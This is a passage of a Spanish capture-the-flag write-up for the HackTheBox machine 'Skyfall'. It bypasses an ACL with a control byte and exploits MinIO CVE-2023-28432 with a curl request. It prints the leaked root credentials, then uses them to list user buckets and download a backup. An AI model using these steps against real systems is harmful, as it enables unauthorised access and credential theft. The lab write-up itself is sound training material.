+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>@app.route(<span style="color:#0ff;font-weight:bold">&#39;/admin&#39;</span>, methods = [<span style="color:#0ff;font-weight:bold">&#39;GET&#39;</span>])
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span><span style="color:#fff;font-weight:bold">def</span> admin():
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>    data = {<span style="color:#0ff;font-weight:bold">&#34;url&#34;</span>:request.url, <span style="color:#0ff;font-weight:bold">&#34;admin&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;True&#34;</span>}
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>    <span style="color:#fff;font-weight:bold">return</span> Response(<span style="color:#fff;font-weight:bold">str</span>(data), mimetype=<span style="color:#0ff;font-weight:bold">&#34;application/json&#34;</span>)</span></span></code></pre></div>
+<blockquote>
+<p>As you can see below, it&rsquo;s possible to circumvent the ACL protection by adding the character \x85 at the end of the pathname:</p>
+</blockquote>
+<p>Podríamos saltarnos esta restricción añadiendo el carácter <code>\x85</code> al final del <code>pathname</code></p>
+<p>Para probar, añadimos el byte en esta posición.
+<img src="images/Screenshot_10.png" alt="Write-up Image"></p>
+<p>Podemos ver que está insertado correctamente.
+<img src="images/Screenshot_11.png" alt="Write-up Image"></p>
+<p>Y no conseguimos nada.
+<img src="images/Screenshot_12.png" alt="Write-up Image"></p>
+<p>Vamos a probar los demás caracteres.
+<code>\x85, \xA0, \x1F, \x1E, \x1D, \x1C, \x0C, \x0B, and \x09</code></p>
+<p>¡El byte <code>\x0c</code> sirve para saltarnos esta restricción!
+<img src="images/Screenshot_13.png" alt="Write-up Image"></p>
+<p>Al final de todas las métricas encontramos una URL, según el atributo es un endpoint de <code>minio</code>.
+<img src="images/Screenshot_14.png" alt="Write-up Image"></p>
+<p>Agregamos el subdominio <code>prd23-s3-backend.skyfall.htb</code> al <code>/etc/hosts</code></p>
+<h2 id="information-disclosure---cve-2023-28432">Information Disclosure -&gt; CVE-2023-28432</h2>
+<p>Tras buscar vulnerabilidades en Minio, encontré <a href="https://www.sentinelone.com/blog/cve-2023-28432/">el siguiente post</a> donde habla de una fuga de información que ocurre en un endpoint en una versión desactualizada de este software.</p>
+<p>En esta vulnerabilidad al mandar una petición POST al endpoint <code>/minio/bootstrap/v1/verify</code> se filtrarían los campos <code>MINIO_ROOT_USER</code> y <code>MINIO_ROOT_PASSWORD</code></p>
+<p>Podemos hacer esta petición con cURL mismamente.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ curl -X POST http://prd23-s3-backend.skyfall.htb/minio/bootstrap/v1/verify
+</span></span></code></pre></div>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>{<span style="font-weight:bold">&#34;MinioEndpoints&#34;</span>:[{<span style="font-weight:bold">&#34;Legacy&#34;</span>:<span style="color:#fff;font-weight:bold">false</span>,<span style="font-weight:bold">&#34;SetCount&#34;</span>:<span style="color:#ff0;font-weight:bold">1</span>,<span style="font-weight:bold">&#34;DrivesPerSet&#34;</span>:<span style="color:#ff0;font-weight:bold">4</span>,<span style="font-weight:bold">&#34;Endpoints&#34;</span>:[{<span style="font-weight:bold">&#34;Scheme&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;http&#34;</span>,<span style="font-weight:bold">&#34;Opaque&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;&#34;</span>,<span style="font-weight:bold">&#34;User&#34;</span>:<span style="color:#fff;font-weight:bold">null</span>,<span style="font-weight:bold">&#34;Host&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;minio-node1:9000&#34;</span>,<span style="font-weight:bold">&#34;Path&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;/data1&#34;</span>,<span style="font-weight:bold">&#34;RawPath&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;&#34;</span>,<span style="font-weight:bold">&#34;OmitHost&#34;</span>:<span style="color:#fff;font-weight:bold">false</span>,<span style="font-weight:bold">&#34;ForceQuery&#34;</span>:<span style="color:#fff;font-weight:bold">false</span>,<span style="font-weight:bold">&#34;RawQuery&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;&#34;</span>,<span style="font-weight:bold">&#34;Fragment&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;&#34;</span>,<span style="font-weight:bold">&#34;RawFragment&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;&#34;</span>,<span style="font-weight:bold">&#34;IsLocal&#34;</span>:<span style="color:#fff;font-weight:bold">true</span>},{<span style="font-weight:bold">&#34;Scheme&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;http&#34;</span>,<span style="font-weight:bold">&#34;Opaque&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;&#34;</span>,<span style="font-weight:bold">&#34;User&#34;</span>:<span style="color:#fff;font-weight:bold">null</span>,<span style="font-weight:bold">&#34;Host&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;minio-node2:9000&#34;</span>,<span style="font-weight:bold">&#34;Path&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;/data1&#34;</span>,<span style="font-weight:bold">&#34;RawPath&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;&#34;</span>,<span style="font-weight:bold">&#34;OmitHost&#34;</span>:<span style="color:#fff;font-weight:bold">false</span>,<span style="font-weight:bold">&#34;ForceQuery&#34;</span>:<span style="color:#fff;font-weight:bold">false</span>,<span style="font-weight:bold">&#34;RawQuery&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;&#34;</span>,<span style="font-weight:bold">&#34;Fragment&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;&#34;</span>,<span style="font-weight:bold">&#34;RawFragment&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;&#34;</span>,<span style="font-weight:bold">&#34;IsLocal&#34;</span>:<span style="color:#fff;font-weight:bold">false</span>},{<span style="font-weight:bold">&#34;Scheme&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;http&#34;</span>,<span style="font-weight:bold">&#34;Opaque&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;&#34;</span>,<span style="font-weight:bold">&#34;User&#34;</span>:<span style="color:#fff;font-weight:bold">null</span>,<span style="font-weight:bold">&#34;Host&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;minio-node1:9000&#34;</span>,<span style="font-weight:bold">&#34;Path&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;/data2&#34;</span>,<span style="font-weight:bold">&#34;RawPath&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;&#34;</span>,<span style="font-weight:bold">&#34;OmitHost&#34;</span>:<span style="color:#fff;font-weight:bold">false</span>,<span style="font-weight:bold">&#34;ForceQuery&#34;</span>:<span style="color:#fff;font-weight:bold">false</span>,<span style="font-weight:bold">&#34;RawQuery&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;&#34;</span>,<span style="font-weight:bold">&#34;Fragment&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;&#34;</span>,<span style="font-weight:bold">&#34;RawFragment&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;&#34;</span>,<span style="font-weight:bold">&#34;IsLocal&#34;</span>:<span style="color:#fff;font-weight:bold">true</span>},{<span style="font-weight:bold">&#34;Scheme&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;http&#34;</span>,<span style="font-weight:bold">&#34;Opaque&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;&#34;</span>,<span style="font-weight:bold">&#34;User&#34;</span>:<span style="color:#fff;font-weight:bold">null</span>,<span style="font-weight:bold">&#34;Host&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;minio-node2:9000&#34;</span>,<span style="font-weight:bold">&#34;Path&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;/data2&#34;</span>,<span style="font-weight:bold">&#34;RawPath&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;&#34;</span>,<span style="font-weight:bold">&#34;OmitHost&#34;</span>:<span style="color:#fff;font-weight:bold">false</span>,<span style="font-weight:bold">&#34;ForceQuery&#34;</span>:<span style="color:#fff;font-weight:bold">false</span>,<span style="font-weight:bold">&#34;RawQuery&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;&#34;</span>,<span style="font-weight:bold">&#34;Fragment&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;&#34;</span>,<span style="font-weight:bold">&#34;RawFragment&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;&#34;</span>,<span style="font-weight:bold">&#34;IsLocal&#34;</span>:<span style="color:#fff;font-weight:bold">false</span>}],<span style="font-weight:bold">&#34;CmdLine&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;http://minio-node{1...2}/data{1...2}&#34;</span>,<span style="font-weight:bold">&#34;Platform&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;OS: linux | Arch: amd64&#34;</span>}],<span style="font-weight:bold">&#34;MinioEnv&#34;</span>:{<span style="font-weight:bold">&#34;MINIO_ACCESS_KEY_FILE&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;access_key&#34;</span>,<span style="font-weight:bold">&#34;MINIO_BROWSER&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;off&#34;</span>,<span style="font-weight:bold">&#34;MINIO_CONFIG_ENV_FILE&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;config.env&#34;</span>,<span style="font-weight:bold">&#34;MINIO_KMS_SECRET_KEY_FILE&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;kms_master_key&#34;</span>,<span style="font-weight:bold">&#34;MINIO_PROMETHEUS_AUTH_TYPE&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;public&#34;</span>,<span style="font-weight:bold">&#34;MINIO_ROOT_PASSWORD&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;GkpjkmiVmpFuL2d3oRx0&#34;</span>,<span style="font-weight:bold">&#34;MINIO_ROOT_PASSWORD_FILE&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;secret_key&#34;</span>,<span style="font-weight:bold">&#34;MINIO_ROOT_USER&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;5GrE1B2YGGyZzNHZaIww&#34;</span>,<span style="font-weight:bold">&#34;MINIO_ROOT_USER_FILE&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;access_key&#34;</span>,<span style="font-weight:bold">&#34;MINIO_SECRET_KEY_FILE&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;secret_key&#34;</span>,<span style="font-weight:bold">&#34;MINIO_UPDATE&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;off&#34;</span>,<span style="font-weight:bold">&#34;MINIO_UPDATE_MINISIGN_PUBKEY&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;RWTx5Zr1tiHQLwG9keckT0c45M3AGeHD6IvimQHpyRywVWGbP1aVSGav&#34;</span>}}</span></span></code></pre></div>
+<p>Vemos que el usuario es: <code>5GrE1B2YGGyZzNHZaIww</code>
+La contraseña es: <code>GkpjkmiVmpFuL2d3oRx0</code></p>
+<p>Ahora tenemos acceso completo a la instancia de Minio, por lo cual tenemos acceso a todos los archivos que estén en el S3.</p>
+<p>Nos podemos descargar <code>mc</code> que es un cliente de consola para Minio de <a href="https://dl.min.io/client/mc/release/linux-amd64/mc">aquí</a></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>wget https://dl.min.io/client/mc/release/linux-amd64/mc
+</span></span></code></pre></div>
+<p>Ahora le damos permisos de ejecución</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ chmod +x mc
+</span></span></code></pre></div>
+<p>Y ya lo podemos usar.</p>
+<p>Como son unas credenciales largas y dificiles de recordar, un consejo que os doy es exportar unas variables globales que se llamen <code>USERNAME</code> y <code>PASSWORD</code> con las credenciales y así no tenéis que recordarlas, simplemente podéis invocar las variables <code>$USERNAME</code> y <code>$PASSWORD</code></p>
+<p>Las credenciales están guardadas en el fichero <code>combo.txt</code> donde a la izquierda está el usuario y delimitado con <code>:</code> a la derecha está la credencial.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ cat combo.txt 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>5GrE1B2YGGyZzNHZaIww:GkpjkmiVmpFuL2d3oRx0
+</span></span></code></pre></div>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ <span style="color:#fff;font-weight:bold">export</span> USERNAME=<span style="color:#fff;font-weight:bold">$(</span>cat combo.txt | awk -F: <span style="color:#0ff;font-weight:bold">&#39;{print $1}&#39;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>$ <span style="color:#fff;font-weight:bold">export</span> PASSWORD=<span style="color:#fff;font-weight:bold">$(</span>cat combo.txt | awk -F: <span style="color:#0ff;font-weight:bold">&#39;{print $2}&#39;</span><span style="color:#fff;font-weight:bold">)</span>
+</span></span></code></pre></div>
+<p>Y lo podemos comprobar</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ <span style="color:#fff;font-weight:bold">echo</span> $USERNAME
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>5GrE1B2YGGyZzNHZaIww
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>$ <span style="color:#fff;font-weight:bold">echo</span> $PASSWORD
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>GkpjkmiVmpFuL2d3oRx0
+</span></span></code></pre></div>
+<p>Según la <a href="">documentación de Minio</a>(<a href="https://min.io/docs/minio/linux/reference/minio-mc/minio-client-settings.html">https://min.io/docs/minio/linux/reference/minio-mc/minio-client-settings.html</a>) podemos configurar cual es nuestro S3 con <code>mc alias set</code>
+<img src="images/Screenshot_15.png" alt="Write-up Image"></p>
+<p><code>mc alias set myminio https://myminio.example.net minioadminuser minioadminpassword</code></p>
+<p>Nos encontramos con el siguiente error.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ ./mc <span style="color:#fff;font-weight:bold">alias</span> <span style="color:#fff;font-weight:bold">set</span> skyfall http://prd23-s3-backend.skyfall.htb/ $USERNAME $PASSWORD
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>mc: &lt;ERROR&gt; Unable to initialize new alias from the provided credentials. The difference between the request time and the server&#39;s time is too large.
+</span></span></code></pre></div>
+<p>Esto pasa porque la hora de mi sistema está desincronizada.</p>
+<p>Podemos sincronizarla de esta manera.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>sudo ntpdate ntp.ubuntu.com
+</span></span></code></pre></div>
+<p>Y ahora si que podemos añadir el alias.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ ./mc <span style="color:#fff;font-weight:bold">alias</span> <span style="color:#fff;font-weight:bold">set</span> skyfall http://prd23-s3-backend.skyfall.htb $USERNAME $PASSWORD
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>Added `skyfall` successfully.
+</span></span></code></pre></div>
+<h2 id="exploring-s3---information-leakage">Exploring S3 -&gt; Information Leakage</h2>
+<p>Ahora podemos explorar los buckets.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ ./mc ls skyfall
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>[2023-11-08 05:59:15 CET]     0B askyy/
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>[2023-11-08 05:58:56 CET]     0B btanner/
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>[2023-11-08 05:58:33 CET]     0B emoneypenny/
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>[2023-11-08 05:58:22 CET]     0B gmallory/
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>[2023-11-08 01:08:01 CET]     0B guest/
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>[2023-11-08 05:59:05 CET]     0B jbond/
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8</span><span>[2023-11-08 05:58:10 CET]     0B omansfield/
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">9</span><span>[2023-11-08 05:58:45 CET]     0B rsilva/
+</span></span></code></pre></div>
+<p>Con un one-liner en bash podemos ver todos los archivos de los buckets de los usuarios fácilmente.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>$ <span style="color:#fff;font-weight:bold">for</span> user in <span style="color:#fff;font-weight:bold">$(</span>./mc ls skyfall | awk <span style="color:#0ff;font-weight:bold">&#39;{print $5}&#39;</span><span style="color:#fff;font-weight:bold">)</span>; <span style="color:#fff;font-weight:bold">do</span> <span style="color:#fff;font-weight:bold">echo</span> <span style="color:#0ff;font-weight:bold">&#34;En el usuario </span>$user<span style="color:#0ff;font-weight:bold"> -&gt;&#34;</span> &amp;&amp; ./mc ls skyfall/$user; <span style="color:#fff;font-weight:bold">done</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>En el usuario askyy/ -&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>[2023-11-08 06:35:28 CET]  48KiB STANDARD Welcome.pdf
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>[2023-11-09 22:37:25 CET] 2.5KiB STANDARD home_backup.tar.gz
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>En el usuario btanner/ -&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>[2023-11-08 06:35:36 CET]  48KiB STANDARD Welcome.pdf
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>En el usuario emoneypenny/ -&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>[2023-11-08 06:35:56 CET]  48KiB STANDARD Welcome.pdf
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>En el usuario gmallory/ -&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>[2023-11-08 06:36:02 CET]  48KiB STANDARD Welcome.pdf
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>En el usuario guest/ -&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>[2023-11-08 01:08:05 CET]  48KiB STANDARD Welcome.pdf
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>En el usuario jbond/ -&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>[2023-11-08 06:35:45 CET]  48KiB STANDARD Welcome.pdf
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>En el usuario omansfield/ -&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span>[2023-11-08 06:36:09 CET]  48KiB STANDARD Welcome.pdf
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span>En el usuario rsilva/ -&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18</span><span>[2023-11-08 06:35:51 CET]  48KiB STANDARD Welcome.pdf
+</span></span></code></pre></div>
+<p>Vemos que el usuario <code>askyy</code> tiene un fichero <code>home_backup.tar.gz</code></p>
+<p>Nos podemos descargar este comprimido.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ ./mc get skyfall/askyy/home_backup.tar.gz .
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>...kup.tar.gz: 2.48 KiB / 2.48 KiB ┃▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓┃ 20.93 KiB/s 0s
+</span></span></code></pre></div>
+<p>Podemos extraer el comprimido y vemos que contienen varios directorios y archivos típicos de un directorio de trabajo de un usuario en un sistema linux.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>$ tar -xvf home_backup.tar.gz 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>./
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>./.profile
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>./.bashrc
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>./.ssh/
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>./.ssh/authorized_keys
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>./.sudo_as_admin_successful
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>./.bash_history
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>./.bash_logout
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>./.cache/
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>./.cache/motd.legal-displayed
+</span></span></code></pre></div>
+<p>Analizando estos archivos no encontramos nada.</p>
+<p>Revisando otra vez la documentación de Minio, me encontré que existe un sistema de versioning, es decir, que ese archivo quizás tenga una versión mas antigua con otra información (como los commits de Git)
+<img src="images/Screenshot_16.png" alt="Write-up Image"></p>
